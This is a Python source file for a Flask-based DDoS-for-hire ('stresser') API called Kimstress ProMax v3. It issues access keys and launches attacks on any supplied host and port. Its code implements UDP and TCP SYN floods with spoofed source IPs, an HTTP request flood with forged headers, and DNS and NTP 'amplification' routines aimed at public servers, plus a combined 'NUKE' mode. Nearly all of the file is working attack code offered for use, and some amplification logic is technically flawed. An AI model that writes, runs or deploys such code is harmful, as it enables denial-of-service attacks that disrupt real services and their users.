# kim_style_api_pro_fixed.py - Kimstress ProMax v3 | Blackout DDoS Engine (FIXED)
from flask import Flask, request, jsonify
import threading
import time
import socket
import random
import os
import struct
import hashlib
from concurrent.futures import ThreadPoolExecutor
import sys

app = Flask(__name__)

# ============ 🔑 CONFIGURATION ============
MASTER_SECRET = "Rohon@8830"  # Master seed for keygen
API_KEYS = set()  # Store generated keys
MAX_WORKERS = 2000
MAX_CONCURRENT_ATTACKS = 20
LOGGING = False

# Attack tracking
active_attacks = {}
attack_counter = 0
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

# ============ 🔐 KEY GENERATOR ============
@app.route('/api/v1/genkey', methods=['GET'])
def generate_key():
    timestamp = str(time.time())
    key = hashlib.sha256((MASTER_SECRET + timestamp + str(random.randint(1000, 9999))).encode()).hexdigest()[:16].upper()
    key = f"{key[:4]}-{key[4:8]}-{key[8:12]}-{key[12:]}"
    API_KEYS.add(key)
    return jsonify({'success': True, 'key': key, 'message': 'Use within 5 mins. Then regenerate.'})

# ============ 💣 KIMSTYLE PROMAX PAYLOADS (FIXED) ============

class KimStylePro:
    @staticmethod
    def udp_tsunami_pro(target, port, duration):
        """UDP Tsunami Pro — with real spoofed fragments"""
        end_time = time.time() + max(10, min(600, duration))
        packet_count = 0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("❌ Raw socket failed. Run as root!")
            return

        def rand_ip():
            return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(0,254)}"

        def build_ip_hdr(s_ip, d_ip, proto, payload_len):
            ihl = 5
            ver = 4
            tos = 0
            tot_len = ihl * 4 + 8 + payload_len  # IP + UDP + payload
            id = random.randint(10000, 65535)
            frag = 0
            ttl = 64
            chk = 0
            s_addr = socket.inet_aton(s_ip)
            d_addr = socket.inet_aton(d_ip)
            ihl_ver = (ver << 4) + ihl
            return struct.pack('!BBHHHBBH4s4s', ihl_ver, tos, tot_len, id, frag, ttl, proto, chk, s_addr, d_addr)

        def build_udp_hdr(s_port, d_port, data_len):
            return struct.pack('!HHHH', s_port, d_port, 8 + data_len, 0)

        def send_frag():
            nonlocal packet_count
            while time.time() < end_time:
                try:
                    src_ip = rand_ip()
                    src_port = random.randint(1024, 65535)
                    payload = os.urandom(1400)
                    udp_hdr = build_udp_hdr(src_port, port, len(payload))
                    ip_hdr = build_ip_hdr(src_ip, target, socket.IPPROTO_UDP, len(payload))
                    packet = ip_hdr + udp_hdr + payload
                    sock.sendto(packet, (target, 0))
                    packet_count += 1
                except: pass
            sock.close()

        [threading.Thread(target=send_frag).start() for _ in range(50)]
        print(f"💥 UDP Pro: {packet_count} spoofed packets sent to {target}:{port}")

    @staticmethod
    def tcp_syn_flood_pro(target, port, duration):
        end_time = time.time() + max(10, min(600, duration))

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print("❌ TCP Raw socket failed.")
            return

        def chksum(msg):
            s = 0
            for i in range(0, len(msg), 2):
                w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
                s += w
            s = (s >> 16) + (s & 0xffff)
            s = ~s & 0xffff
            return s

        def build_syn_pkt(src, dst, sport, dport):
            ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(dst))
            tcp_h = struct.pack('!HHLLBBHHH', sport, dport, 0, 0, 80, 2, 8192, 0, 0)
            psh = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst), 0, 6, len(tcp_h))
            tcp_h = struct.pack('!HHLLBBH', sport, dport, 0, 0, 80, 2, 8192) + struct.pack('H', chksum(psh + tcp_h)) + struct.pack('!H', 0)
            return ip_h + tcp_h

        def flood():
            while time.time() < end_time:
                try:
                    src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(0,254)}"
                    sport = random.randint(1024, 65535)
                    packet = build_syn_pkt(src, target, sport, port)
                    sock.sendto(packet, (target, 0))
                except: pass
            sock.close()

        [threading.Thread(target=flood).start() for _ in range(30)]
        print(f"💥 TCP SYN Pro: Flooding {target}:{port} with SYN+Spoof")

    @staticmethod
    def http_rapid_fire_pro(target, port, duration):
        try:
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
        except:
            os.system("pip install requests")
            return

        session = requests.Session()
        retry = Retry(total=10, backoff_factor=0.1)
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=500, max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
        ]

        urls = [f"http://{target}:{port}/"] * 6

        end_time = time.time() + duration
        req_count = 0

        def http_flood():
            nonlocal req_count
            while time.time() < end_time:
                for url in urls:
                    try:
                        headers = {
                            'User-Agent': random.choice(user_agents),
                            'X-Forwarded-For': f"192.168.1.{random.randint(1,254)}",
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache'
                        }
                        session.get(url, headers=headers, timeout=3, verify=False)
                        session.post(url, data={'a': os.urandom(64)}, headers=headers, timeout=3, verify=False)
                        req_count += 2
                    except: continue

        [threading.Thread(target=http_flood).start() for _ in range(100)]
        print(f"💥 HTTP Pro: {req_count} requests fired at {target}:{port}")

    @staticmethod
    def dns_amp_pro(target, duration):
        resolvers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
        query = bytes.fromhex("abcd01000001000000000000076578616d706c6503636f6d0000ff0001")
        end_time = time.time() + duration
        sent = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while time.time() < end_time:
            for r in resolvers:
                try:
                    sock.sendto(query, (r, 53))
                    sock.sendto(query, (target, 53))
                    sent += 2
                except: pass
        sock.close()
        print(f"💥 DNS Amp: {sent} reflection packets sent → {target}")

    @staticmethod
    def ntp_amp(target, duration):
        ntp_servers = ["pool.ntp.org", "time.google.com"]
        payload = b'\x1b' + 47 * b'\0'
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while time.time() < end_time:
            for server in ntp_servers:
                try:
                    ip = socket.gethostbyname(server)
                    sock.sendto(payload, (ip, 123))
                    sock.sendto(payload, (target, 123))
                except: pass
        sock.close()

    @staticmethod
    def nuke_all(target, port, duration):
        methods = [
            lambda: KimStylePro.udp_tsunami_pro(target, port, duration),
            lambda: KimStylePro.tcp_syn_flood_pro(target, port, duration),
            lambda: KimStylePro.http_rapid_fire_pro(target, port, duration),
            lambda: KimStylePro.dns_amp_pro(target, duration),
            lambda: KimStylePro.ntp_amp(target, duration)
        ]
        [threading.Thread(target=m).start() for m in methods]

# ============ 🛠️ SYSTEM OPTIMIZER ============
def optimize_system():
    os.system("sysctl -w net.core.rmem_max=134217728 > /dev/null 2>&1")
    os.system("sysctl -w net.core.wmem_max=134217728 > /dev/null 2>&1")
    os.system("sysctl -w net.ipv4.tcp_rmem='4096 87380 134217728' > /dev/null 2>&1")
    os.system("sysctl -w net.ipv4.tcp_wmem='4096 65536 134217728' > /dev/null 2>&1")
    os.system("sysctl -w net.core.netdev_max_backlog=5000 > /dev/null 2>&1")
    os.system("ulimit -n 999999 > /dev/null 2>&1")
    print("✅ System optimized for blackout")

# ============ 🚀 API ENDPOINTS ============
@app.route('/api/v1/attack/start', methods=['GET', 'POST'])
def attack():
    global attack_counter
    key = request.args.get('key') or request.form.get('key')
    host = request.args.get('host') or request.form.get('host')
    port = request.args.get('port') or request.form.get('port')
    duration = request.args.get('time') or request.form.get('time')
    method = request.args.get('method') or request.form.get('method') or 'NUKE'

    if key not in API_KEYS: return jsonify({'error': 'Invalid or expired API key'}), 401
    if not host: return jsonify({'error': 'Host required'}), 400

    try: port = int(port) if port else 80
    except: port = 80

    try: duration = max(10, min(600, int(duration)))
    except: duration = 60

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return jsonify({'error': 'Server busy'}), 429

    attack_id = f"KIM-{random.randint(10000,99999)}"
    active_attacks[attack_id] = {'target': f"{host}:{port}", 'end': time.time() + duration}
    attack_counter += 1

    def run():
        try:
            if method == "UDP": KimStylePro.udp_tsunami_pro(host, port, duration)
            elif method == "TCP": KimStylePro.tcp_syn_flood_pro(host, port, duration)
            elif method == "HTTP": KimStylePro.http_rapid_fire_pro(host, port, duration)
            elif method == "DNS": KimStylePro.dns_amp_pro(host, duration)
            elif method == "NUKE": KimStylePro.nuke_all(host, port, duration)
            else: KimStylePro.udp_tsunami_pro(host, port, duration)
        finally:
            active_attacks.pop(attack_id, None)

    executor.submit(run)
    return jsonify({'success': True, 'attack_id': attack_id, 'target': f"{host}:{port}", 'method': method, 'duration': duration})

@app.route('/api/v1/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'online',
        'mode': 'BLACKOUT PRO',
        'active_attacks': len(active_attacks),
        'total_attacks': attack_counter,
        'api_keys_generated': len(API_KEYS)
    })

@app.route('/api/v1/stop', methods=['GET'])
def stop():
    key = request.args.get('key')
    if key not in API_KEYS: return jsonify({'error': 'Invalid key'}), 401
    active_attacks.clear()
    return jsonify({'message': 'All attacks stopped'})

# ============ 🏁 START SERVER ============
if __name__ == '__main__':
    optimize_system()
    print("\n" + "="*60)
    print("🔥 KIMSTRESS PROMAX v3 — BLACKOUT ENGINE ACTIVE")
    print("="*60)
    print("🔑 Generate API Key: curl http://your-server:5000/api/v1/genkey")
    print(f"⚡ Max Threads: {MAX_WORKERS}")
    print(f"💥 Max Concurrent: {MAX_CONCURRENT_ATTACKS}")
    print(f"🌐 Listening on 0.0.0.0:5000")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)